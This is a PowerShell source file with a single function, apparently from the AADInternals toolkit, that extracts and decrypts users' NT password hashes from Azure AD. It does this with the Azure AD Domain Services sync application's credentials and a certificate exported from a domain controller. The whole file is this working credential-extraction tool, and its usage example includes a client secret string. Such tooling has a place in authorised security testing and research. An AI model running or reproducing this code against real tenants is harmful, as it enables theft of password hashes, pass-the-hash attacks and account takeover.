
# Gets users NT Hashes from Azure AD
# Dec 22nd 2022
function Get-UserNTHash
{
<#
    .SYNOPSIS
    Exports and decrypts the NTHashes from Azure AD using the given application and certificate.

    .DESCRIPTION
    Exports and decrypts the NTHashes from Azure AD using the given application and certificate.

    The application must be "Azure AD Domain Services Sync" created during the Azure AD Domain services (AADDS) deployment. Either client certificate or password needs to be provided.

    The encryption certificate needs to be exported from AADDS domain controller.

    .Example
    PS C\:>Get-AADIntUserNTHash -ClientPassword "vlb8Q~W8iVXwfdt2FjIH4FE0hRc-p9G_kyN_KbtZ" -ClientId "23857e6f-7be4-4bb8-84b7-22e92c359c8d" -PfxFileName .\encryption_cert.pfx

    NTHash                           UserPrincipalName                  
    ------                           -----------------                  
    00000000000000000000000000000000 user1@company.com
    11111111111111111111111111111111 user2@company.com
#>
    [cmdletbinding()]
    Param(
        [Parameter(ParameterSetName='ClientPassword', Mandatory=$False)]
        [Parameter(ParameterSetName='ClientCert'    , Mandatory=$True)]
        [string]$ClientPfxFileName,
        [Parameter(ParameterSetName='ClientPassword', Mandatory=$True)]
        [Parameter(ParameterSetName='ClientCert'    , Mandatory=$False)]
        [string]$ClientPassword,
        [Parameter(Mandatory=$False)]
        [string]$ClientPfxPassword,
        [Parameter(Mandatory=$True)]
        [string]$PfxFileName,
        [Parameter(Mandatory=$False)]
        [string]$PfxPassword,
        [Parameter(Mandatory=$False)]
        [guid]$TenantId,
        [Parameter(Mandatory=$True)]
        [guid]$ClientId,
        [Parameter(Mandatory=$False)]
        [String]$UserPrincipalName
    )
    Process
    {
        # Load certificates
        if(![string]::IsNullOrEmpty($ClientPfxFileName))
        {
            $clientCertificate = Load-Certificate -FileName $ClientPfxFileName -Password $ClientPfxPassword -Exportable
        }
        $decryptionCertificate = Load-Certificate -FileName $PfxFileName -Password $PfxPassword -Exportable

        # Parse the tenant name from the cert and get id if not provided
        if([string]::IsNullOrEmpty($TenantId))
        {
            $domainName = $decryptionCertificate.Subject.Split("-")[1].Trim()
            $TenantId = Get-TenantID -Domain $domainName
        }

        # Get access token
        $access_token = Get-DCaaSAccessToken -Certificate $clientCertificate -TenantId $TenantId -ClientId $ClientId -Password $ClientPassword
        
        $queryString = '$select=id,onPremisesImmutableId,onPremisesSecurityIdentifier,userPrincipalName,windowsLegacyCredentials'#,windowsSupplementalCredentials'
        if(![string]::IsNullOrEmpty($UserPrincipalName))
        {
            $queryString += "&`$filter=userPrincipalName eq '$UserPrincipalName'"
        }
        
        $results = Call-MSGraphAPI -AccessToken $access_token -API users -QueryString $queryString
        
        foreach($result in $results)
        {
            if($result.windowsLegacyCredentials)
            {
                $binLegacyCreds = Convert-B64ToByteArray -B64 $result.windowsLegacyCredentials
                $ADAuthInfo = Unprotect-ADAuthInfo -Data $binLegacyCreds -Certificate $decryptionCertificate
                if($ADAuthInfo)
                {
                    $binHash = $ADAuthInfo[8..($ADAuthInfo.length)]
                    [PSCustomObject][ordered]@{
                        "NTHash" = Convert-ByteArrayToHex -Bytes $binHash
                        "UserPrincipalName" = $result.UserPrincipalName
                    }
                }
                else
                {
                    Write-Verbose "Decryption failed: $($result.UserPrincipalName)"
                }
            }
            else
            {
                Write-Verbose "No NTHash:         $($result.UserPrincipalName)"
            }
        }
    }
}

